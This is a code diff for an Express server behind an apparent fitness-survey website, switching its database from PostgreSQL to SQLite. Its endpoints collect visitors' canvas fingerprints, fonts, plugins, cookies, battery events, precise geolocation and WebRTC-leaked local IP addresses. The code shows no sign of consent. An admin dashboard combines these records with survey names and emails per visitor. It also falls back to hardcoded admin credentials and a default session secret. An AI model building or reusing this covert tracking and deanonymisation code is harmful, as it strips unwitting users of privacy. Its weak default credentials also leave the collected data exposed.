@@ -1,86 +1,108 @@
 const express = require('express');
-const { Pool } = require('pg');
+const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
 const session = require('express-session');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// PostgreSQL connection
-const pool = new Pool({
-    connectionString: process.env.DATABASE_URL || 'postgres://username:password@localhost:5432/gatech_fitness',
-    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
+// Enable trust proxy for DigitalOcean App Platform
+app.set('trust proxy', true); // Trust the first proxy (DigitalOcean's load balancer)
+
+// SQLite database connection
+const db = new sqlite3.Database(process.env.DATABASE_PATH || './gatech_fitness.db', (err) => {
+    if (err) {
+        console.error('Error opening SQLite database:', err.message);
+    } else {
+        console.log('Connected to SQLite database');
+    }
 });
 
 // Initialize database tables
-pool.query(`
-    CREATE TABLE IF NOT EXISTS users (
-        id SERIAL PRIMARY KEY,
-        ip TEXT,
-        userId TEXT,
-        timestamp TEXT,
-        userAgent TEXT,
-        browser JSONB,
-        screen JSONB,
-        window JSONB,
-        device JSONB,
-        connection JSONB,
-        referrer TEXT,
-        url TEXT,
-        cookies TEXT,
-        timezone TEXT,
-        plugins JSONB,
-        mimeTypes JSONB,
-        canvasFingerprint TEXT,
-        sessionDuration TEXT,
-        battery JSONB,
-        fonts JSONB,
-        mediaDevices JSONB
-    );
-    CREATE TABLE IF NOT EXISTS surveys (
-        id SERIAL PRIMARY KEY,
-        ip TEXT,
-        userId TEXT,
-        timestamp TEXT,
-        name TEXT,
-        email TEXT,
-        frequency TEXT,
-        goal TEXT,
-        feedback TEXT
-    );
-    CREATE TABLE IF NOT EXISTS geo (
-        id SERIAL PRIMARY KEY,
-        ip TEXT,
-        userId TEXT,
-        timestamp TEXT,
-        latitude FLOAT,
-        longitude FLOAT,
-        accuracy FLOAT,
-        altitude FLOAT,
-        heading FLOAT,
-        speed FLOAT
-    );
-    CREATE TABLE IF NOT EXISTS webrtc (
-        id SERIAL PRIMARY KEY,
-        ip TEXT,
-        userId TEXT,
-        timestamp TEXT,
-        localIp TEXT
-    );
-    CREATE TABLE IF NOT EXISTS battery (
-        id SERIAL PRIMARY KEY,
-        ip TEXT,
-        userId TEXT,
-        timestamp TEXT,
-        batteryEvent JSONB
-    );
-`).catch(err => console.error('Error creating tables:', err));
+db.serialize(() => {
+    db.run(`
+        CREATE TABLE IF NOT EXISTS users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip TEXT,
+            userId TEXT,
+            timestamp TEXT,
+            userAgent TEXT,
+            browser TEXT,
+            screen TEXT,
+            window TEXT,
+            device TEXT,
+            connection TEXT,
+            referrer TEXT,
+            url TEXT,
+            cookies TEXT,
+            timezone TEXT,
+            plugins TEXT,
+            mimeTypes TEXT,
+            canvasFingerprint TEXT,
+            sessionDuration TEXT,
+            battery TEXT,
+            fonts TEXT,
+            mediaDevices TEXT
+        )
+    `);
+    db.run(`
+        CREATE TABLE IF NOT EXISTS surveys (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip TEXT,
+            userId TEXT,
+            timestamp TEXT,
+            name TEXT,
+            email TEXT,
+            frequency TEXT,
+            goal TEXT,
+            feedback TEXT
+        )
+    `);
+    db.run(`
+        CREATE TABLE IF NOT EXISTS geo (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip TEXT,
+            userId TEXT,
+            timestamp TEXT,
+            latitude REAL,
+            longitude REAL,
+            accuracy REAL,
+            altitude REAL,
+            heading REAL,
+            speed REAL
+        )
+    `);
+    db.run(`
+        CREATE TABLE IF NOT EXISTS webrtc (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip TEXT,
+            userId TEXT,
+            timestamp TEXT,
+            localIp TEXT
+        )
+    `);
+    db.run(`
+        CREATE TABLE IF NOT EXISTS battery (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip TEXT,
+            userId TEXT,
+            timestamp TEXT,
+            batteryEvent TEXT
+        )
+    `, (err) => {
+        if (err) {
+            console.error('Error creating tables:', err.message);
+        } else {
+            console.log('Database tables created successfully');
+        }
+    });
+});
 
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(session({
-    secret: 'your-secret-key',
+    secret: process.env.SESSION_SECRET || 'your-secret-key',
     resave: false,
     saveUninitialized: false,
     cookie: { secure: process.env.NODE_ENV === 'production' }
@@ -88,8 +110,8 @@ app.use(session({
 
 // Hardcoded credentials (change before deployment)
 const validCredentials = {
-    username: 'admin',
-    password: 'gatech2025'
+    username: process.env.ADMIN_USERNAME || 'admin',
+    password: process.env.ADMIN_PASSWORD || 'gatech2025'
 };
 
 // Authentication middleware
@@ -135,14 +157,55 @@ app.get('/analyzelogs', isAuthenticated, (req, res) => {
 // Summarize log data
 app.get('/summarize', isAuthenticated, async (req, res) => {
     try {
-        const userLogs = await pool.query('SELECT * FROM users');
-        const surveyLogs = await pool.query('SELECT * FROM surveys');
-        const geoLogs = await pool.query('SELECT * FROM geo');
-        const webrtcLogs = await pool.query('SELECT * FROM webrtc');
-        const batteryLogs = await pool.query('SELECT * FROM battery');
+        // SQLite queries return JSON strings for complex fields, so we parse them
+        const userLogs = await new Promise((resolve, reject) => {
+            db.all('SELECT * FROM users', [], (err, rows) => {
+                if (err) reject(err);
+                resolve(rows.map(row => ({
+                    ...row,
+                    browser: row.browser ? JSON.parse(row.browser) : null,
+                    screen: row.screen ? JSON.parse(row.screen) : null,
+                    window: row.window ? JSON.parse(row.window) : null,
+                    device: row.device ? JSON.parse(row.device) : null,
+                    connection: row.connection ? JSON.parse(row.connection) : null,
+                    plugins: row.plugins ? JSON.parse(row.plugins) : null,
+                    mimeTypes: row.mimeTypes ? JSON.parse(row.mimeTypes) : null,
+                    battery: row.battery ? JSON.parse(row.battery) : null,
+                    fonts: row.fonts ? JSON.parse(row.fonts) : null,
+                    mediaDevices: row.mediaDevices ? JSON.parse(row.mediaDevices) : null
+                })));
+            });
+        });
+        const surveyLogs = await new Promise((resolve, reject) => {
+            db.all('SELECT * FROM surveys', [], (err, rows) => {
+                if (err) reject(err);
+                resolve(rows);
+            });
+        });
+        const geoLogs = await new Promise((resolve, reject) => {
+            db.all('SELECT * FROM geo', [], (err, rows) => {
+                if (err) reject(err);
+                resolve(rows);
+            });
+        });
+        const webrtcLogs = await new Promise((resolve, reject) => {
+            db.all('SELECT * FROM webrtc', [], (err, rows) => {
+                if (err) reject(err);
+                resolve(rows);
+            });
+        });
+        const batteryLogs = await new Promise((resolve, reject) => {
+            db.all('SELECT * FROM battery', [], (err, rows) => {
+                if (err) reject(err);
+                resolve(rows.map(row => ({
+                    ...row,
+                    batteryEvent: row.batteryEvent ? JSON.parse(row.batteryEvent) : null
+                })));
+            });
+        });
 
         const users = {};
-        userLogs.rows.forEach(log => {
+        userLogs.forEach(log => {
             const key = `${log.ip}|${log.userId}`;
             if (!users[key]) {
                 users[key] = { ip: log.ip, userId: log.userId, userData: [], surveyData: [], geoData: [], webrtcData: [], batteryData: [] };
@@ -168,7 +231,7 @@ app.get('/summarize', isAuthenticated, async (req, res) => {
                 mediaDevices: log.mediaDevices
             });
         });
-        surveyLogs.rows.forEach(log => {
+        surveyLogs.forEach(log => {
             const key = `${log.ip}|${log.userId}`;
             if (users[key]) {
                 users[key].surveyData.push({
@@ -181,7 +244,7 @@ app.get('/summarize', isAuthenticated, async (req, res) => {
                 });
             }
         });
-        geoLogs.rows.forEach(log => {
+        geoLogs.forEach(log => {
             const key = `${log.ip}|${log.userId}`;
             if (users[key]) {
                 users[key].geoData.push({
@@ -195,7 +258,7 @@ app.get('/summarize', isAuthenticated, async (req, res) => {
                 });
             }
         });
-        webrtcLogs.rows.forEach(log => {
+        webrtcLogs.forEach(log => {
             const key = `${log.ip}|${log.userId}`;
             if (users[key]) {
                 users[key].webrtcData.push({
@@ -204,7 +267,7 @@ app.get('/summarize', isAuthenticated, async (req, res) => {
                 });
             }
         });
-        batteryLogs.rows.forEach(log => {
+        batteryLogs.forEach(log => {
             const key = `${log.ip}|${log.userId}`;
             if (users[key]) {
                 users[key].batteryData.push({
@@ -214,7 +277,7 @@ app.get('/summarize', isAuthenticated, async (req, res) => {
             }
         });
 
-        const exerciseFrequencies = surveyLogs.rows.reduce((acc, log) => {
+        const exerciseFrequencies = surveyLogs.reduce((acc, log) => {
             acc[log.frequency] = (acc[log.frequency] || 0) + 1;
             return acc;
         }, {});
@@ -237,10 +300,37 @@ app.post('/log', async (req, res) => {
             ip: req.ip || req.connection.remoteAddress,
             timestamp: new Date().toISOString(),
         };
-        await pool.query(
-            `INSERT INTO users (ip, userId, timestamp, userAgent, browser, screen, window, device, connection, referrer, url, cookies, timezone, plugins, mimeTypes, canvasFingerprint, sessionDuration, battery, fonts, mediaDevices) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20)`,
-            [data.ip, data.userId, data.timestamp, data.userAgent, data.browser, data.screen, data.window, data.device, data.connection, data.referrer, data.url, data.cookies, data.timezone, data.plugins, data.mimeTypes, data.canvasFingerprint, data.sessionDuration, data.battery, data.fonts, data.mediaDevices]
-        );
+        await new Promise((resolve, reject) => {
+            db.run(
+                `INSERT INTO users (ip, userId, timestamp, userAgent, browser, screen, window, device, connection, referrer, url, cookies, timezone, plugins, mimeTypes, canvasFingerprint, sessionDuration, battery, fonts, mediaDevices) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+                [
+                    data.ip,
+                    data.userId,
+                    data.timestamp,
+                    data.userAgent,
+                    JSON.stringify(data.browser),
+                    JSON.stringify(data.screen),
+                    JSON.stringify(data.window),
+                    JSON.stringify(data.device),
+                    JSON.stringify(data.connection),
+                    data.referrer,
+                    data.url,
+                    data.cookies,
+                    data.timezone,
+                    JSON.stringify(data.plugins),
+                    JSON.stringify(data.mimeTypes),
+                    data.canvasFingerprint,
+                    data.sessionDuration,
+                    JSON.stringify(data.battery),
+                    JSON.stringify(data.fonts),
+                    JSON.stringify(data.mediaDevices)
+                ],
+                (err) => {
+                    if (err) reject(err);
+                    resolve();
+                }
+            );
+        });
         res.json({ status: 'success', message: 'Data logged' });
     } catch (error) {
         console.error('Error saving log:', error);
@@ -256,10 +346,26 @@ app.post('/log-geo', async (req, res) => {
             ip: req.ip || req.connection.remoteAddress,
             timestamp: new Date().toISOString(),
         };
-        await pool.query(
-            `INSERT INTO geo (ip, userId, timestamp, latitude, longitude, accuracy, altitude, heading, speed) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
-            [data.ip, data.userId, data.timestamp, data.latitude, data.longitude, data.accuracy, data.altitude, data.heading, data.speed]
-        );
+        await new Promise((resolve, reject) => {
+            db.run(
+                `INSERT INTO geo (ip, userId, timestamp, latitude, longitude, accuracy, altitude, heading, speed) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+                [
+                    data.ip,
+                    data.userId,
+                    data.timestamp,
+                    data.latitude,
+                    data.longitude,
+                    data.accuracy,
+                    data.altitude,
+                    data.heading,
+                    data.speed
+                ],
+                (err) => {
+                    if (err) reject(err);
+                    resolve();
+                }
+            );
+        });
         res.json({ status: 'success', message: 'Geo data logged' });
     } catch (error) {
         console.error('Error saving geo log:', error);
@@ -275,10 +381,16 @@ app.post('/log-webrtc', async (req, res) => {
             ip: req.ip || req.connection.remoteAddress,
             timestamp: new Date().toISOString(),
         };
-        await pool.query(
-            `INSERT INTO webrtc (ip, userId, timestamp, localIp) VALUES ($1, $2, $3, $4)`,
-            [data.ip, data.userId, data.timestamp, data.localIp]
-        );
+        await new Promise((resolve, reject) => {
+            db.run(
+                `INSERT INTO webrtc (ip, userId, timestamp, localIp) VALUES (?, ?, ?, ?)`,
+                [data.ip, data.userId, data.timestamp, data.localIp],
+                (err) => {
+                    if (err) reject(err);
+                    resolve();
+                }
+            );
+        });
         res.json({ status: 'success', message: 'WebRTC data logged' });
     } catch (error) {
         console.error('Error saving WebRTC log:', error);
@@ -294,10 +406,25 @@ app.post('/log-survey', async (req, res) => {
             ip: req.ip || req.connection.remoteAddress,
             timestamp: new Date().toISOString(),
         };
-        await pool.query(
-            `INSERT INTO surveys (ip, userId, timestamp, name, email, frequency, goal, feedback) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`,
-            [data.ip, data.userId, data.timestamp, data.name, data.email, data.frequency, data.goal, data.feedback]
-        );
+        await new Promise((resolve, reject) => {
+            db.run(
+                `INSERT INTO surveys (ip, userId, timestamp, name, email, frequency, goal, feedback) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
+                [
+                    data.ip,
+                    data.userId,
+                    data.timestamp,
+                    data.name,
+                    data.email,
+                    data.frequency,
+                    data.goal,
+                    data.feedback
+                ],
+                (err) => {
+                    if (err) reject(err);
+                    resolve();
+                }
+            );
+        });
         res.json({ status: 'success', message: 'Survey data logged' });
     } catch (error) {
         console.error('Error saving survey log:', error);
@@ -313,10 +440,16 @@ app.post('/log-battery', async (req, res) => {
             ip: req.ip || req.connection.remoteAddress,
             timestamp: new Date().toISOString(),
         };
-        await pool.query(
-            `INSERT INTO battery (ip, userId, timestamp, batteryEvent) VALUES ($1, $2, $3, $4)`,
-            [data.ip, data.userId, data.timestamp, data.batteryEvent]
-        );
+        await new Promise((resolve, reject) => {
+            db.run(
+                `INSERT INTO battery (ip, userId, timestamp, batteryEvent) VALUES (?, ?, ?, ?)`,
+                [data.ip, data.userId, data.timestamp, JSON.stringify(data.batteryEvent)],
+                (err) => {
+                    if (err) reject(err);
+                    resolve();
+                }
+            );
+        });
         res.json({ status: 'success', message: 'Battery data logged' });
     } catch (error) {
         console.error('Error saving battery log:', error);
@@ -333,10 +466,25 @@ app.post('/submit', async (req, res) => {
             timestamp: new Date().toISOString(),
             userId: req.body.userId || 'unknown'
         };
-        await pool.query(
-            `INSERT INTO surveys (ip, userId, timestamp, name, email, frequency, goal, feedback) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`,
-            [data.ip, data.userId, data.timestamp, data.name, data.email, data.frequency, data.goal, data.feedback]
-        );
+        await new Promise((resolve, reject) => {
+            db.run(
+                `INSERT INTO surveys (ip, userId, timestamp, name, email, frequency, goal, feedback) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
+                [
+                    data.ip,
+                    data.userId,
+                    data.timestamp,
+                    data.name,
+                    data.email,
+                    data.frequency,
+                    data.goal,
+                    data.feedback
+                ],
+                (err) => {
+                    if (err) reject(err);
+                    resolve();
+                }
+            );
+        });
         res.redirect('/fitness-survey');
     } catch (error) {
         console.error('Error saving form submission:', error);
